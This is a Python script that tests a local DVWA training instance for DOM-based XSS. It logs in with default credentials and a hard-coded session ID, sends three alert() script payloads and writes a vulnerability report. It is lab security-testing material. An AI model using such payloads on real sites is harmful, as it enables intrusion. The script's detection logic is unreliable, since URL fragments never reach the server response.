import requests
from bs4 import BeautifulSoup

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
XSS_URL = 'http://localhost/dvwa/vulnerabilities/xss_d/'
REPORT_FILE = '9xssdomoutput.txt'
DVWA_PATH = r'C:\xampp\htdocs\dvwa\vulnerabilities\xss_d\source\low.php'  # Update this to your actual DVWA installation path

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'admin'

# Replace with your actual session ID
SESSION_ID = '8j076meeafjfigef0e8e91onnn'  # Ensure this is a valid session ID

# Function to perform XSS attack and retrieve data
def perform_xss_attack(session, payload):
    headers = {'Cookie': f'PHPSESSID={SESSION_ID}; security=low'}
    target_url = f'{XSS_URL}#{payload}'
    response = session.get(target_url, headers=headers)
    return target_url, response.text

# Function to login to DVWA and retrieve CSRF token
def login_to_dvwa():
    session = requests.Session()
    session.cookies.set('PHPSESSID', SESSION_ID)

    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')

    # Extract CSRF token
    csrf_token_input = soup.find('input', {'name': 'user_token'})
    csrf_token = csrf_token_input['value'] if csrf_token_input else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return None

    # Login data
    login_data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': csrf_token
    }

    response = session.post(LOGIN_URL, data=login_data)

    if 'Login failed' in response.text:
        print('Login failed')
        return None

    return session

# Function to read the vulnerable PHP file and extract vulnerable code
def extract_vulnerable_xss_code(file_path):
    vulnerable_lines = []
    with open(file_path, 'r') as file:
        lines = file.readlines()
        for i, line in enumerate(lines, start=1):
            if "document.write" in line or "innerHTML" in line:
                vulnerable_lines.append((i, line.strip()))
    return vulnerable_lines

# Function to write report
def write_report(results, vulnerable_code):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA DOM-based XSS Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for payload, (target_url, response_text) in results.items():
            report_file.write(f'Test Payload: {payload}\n')
            report_file.write(f'Target URL: {target_url}\n\n')

            if payload in response_text:
                report_file.write('Vulnerability Detected:\n')
                report_file.write('The DOM-based XSS vulnerability is present because the application processes user input in the client-side JavaScript without proper sanitization.\n')
                report_file.write(f'Vulnerable File URL: {target_url}\n')
            else:
                report_file.write('No vulnerability detected.\n')
            report_file.write('='*40 + '\n\n')

        # Append the vulnerable JavaScript code with line numbers
        report_file.write('Vulnerable JavaScript Code in PHP File:\n')
        report_file.write('='*40 + '\n')

        for line_number, code_line in vulnerable_code:
            report_file.write(f'Line {line_number}: {code_line}\n')
            report_file.write('Reason: DOM-based XSS vulnerability. The user input is processed in the DOM without proper encoding or sanitization.\n')

        report_file.write('='*40 + '\n')

# Main function to run the XSS tests
def run_xss_tests():
    session = login_to_dvwa()

    if not session:
        return

    results = {}

    # XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "\"/><script>alert('XSS')</script>"
    ]

    for payload in payloads:
        print(f'Testing payload: {payload}')
        target_url, response_text = perform_xss_attack(session, payload)
        results[payload] = (target_url, response_text)

    session.close()

    # Extract vulnerable XSS code from the PHP file
    vulnerable_code = extract_vulnerable_xss_code(DVWA_PATH)

    write_report(results, vulnerable_code)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_xss_tests()